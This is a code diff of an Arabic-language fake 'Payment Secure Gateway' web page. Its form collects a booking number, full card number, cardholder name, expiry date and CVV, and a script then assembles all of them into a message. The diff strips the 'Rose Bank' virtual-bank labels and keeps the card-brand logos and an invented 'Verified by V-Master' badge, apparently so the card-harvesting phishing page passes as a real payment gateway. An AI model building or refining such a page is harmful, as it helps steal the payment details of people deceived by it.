@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>بوابة الدفع الآمنة | Rose Bank</title>
+  <title>بوابة الدفع الآمنة</title>
   <link rel="stylesheet" href="style.css" />
   <style>
     .bank-header {
@@ -35,7 +35,7 @@
 
   <header class="bank-header">
     <h1>🔒 Payment Secure Gateway</h1>
-    <p>Encrypted SSL • Verified by V-Master • بنك روز الافتراضي</p>
+    <p>Encrypted SSL • Verified by V-Master</p>
     <div class="secure-icons">
       <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa" />
       <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" />
@@ -49,28 +49,39 @@
       <h2>معلومات الدفع</h2>
       <form id="paymentForm">
         <label for="bookingNumber">رقم الحجز:</label>
-        <input type="text" id="bookingNumber" name="bookingNumber" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required />
+        <input type="text" id="bookingNumber" maxlength="6" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
 
         <label for="cardNumber">رقم البطاقة (16 رقم):</label>
-        <input type="text" id="cardNumber" name="cardNumber" maxlength="16" minlength="16" pattern="\\d{16}" placeholder="1234 5678 9012 3456" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required />
+        <input type="text" id="cardNumber" maxlength="16" pattern="\\d{16}" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required />
 
         <label for="cardHolder">اسم حامل البطاقة:</label>
-        <input type="text" id="cardHolder" name="cardHolder" required />
+        <input type="text" id="cardHolder" required />
 
         <div style="display: flex; gap: 10px;">
           <div style="flex: 1;">
-            <label for="expiryMonth">شهر الانتهاء (MM):</label>
-            <input type="text" id="expiryMonth" maxlength="2" pattern="\\d{2}" placeholder="MM" required />
+            <label for="expiryMonth">الشهر (MM):</label>
+            <select id="expiryMonth" required>
+              <option value="">--</option>
+              <option>01</option><option>02</option><option>03</option>
+              <option>04</option><option>05</option><option>06</option>
+              <option>07</option><option>08</option><option>09</option>
+              <option>10</option><option>11</option><option>12</option>
+            </select>
           </div>
 
           <div style="flex: 1;">
             <label for="expiryYear">السنة (YY):</label>
-            <input type="text" id="expiryYear" maxlength="2" pattern="\\d{2}" placeholder="YY" required />
+            <select id="expiryYear" required>
+              <option value="">--</option>
+              <option>24</option><option>25</option><option>26</option>
+              <option>27</option><option>28</option><option>29</option>
+              <option>30</option>
+            </select>
           </div>
 
           <div style="flex: 1;">
             <label for="cvv">CVV:</label>
-            <input type="text" id="cvv" name="cvv" maxlength="4" pattern="\\d{3,4}" required />
+            <input type="text" id="cvv" maxlength="4" pattern="\\d{3,4}" required />
           </div>
         </div>
 
@@ -81,7 +92,7 @@
   </main>
 
   <footer class="footer">
-    <p>© Rose Bank - All transactions are encrypted and monitored</p>
+    <p>© جميع الحقوق محفوظة • تم تأمين هذه الصفحة عبر تشفير SSL</p>
   </footer>
 
   <script>
@@ -103,7 +114,7 @@
 
 رقم الحجز: ${bookingNumber}
 رقم البطاقة: ${cardNumber}
-الاسم على البطاقة: ${cardHolder}
+اسم حامل البطاقة: ${cardHolder}
 تاريخ الانتهاء: ${expiryMonth}/${expiryYear}
 CVV: ${cvv}
       `;
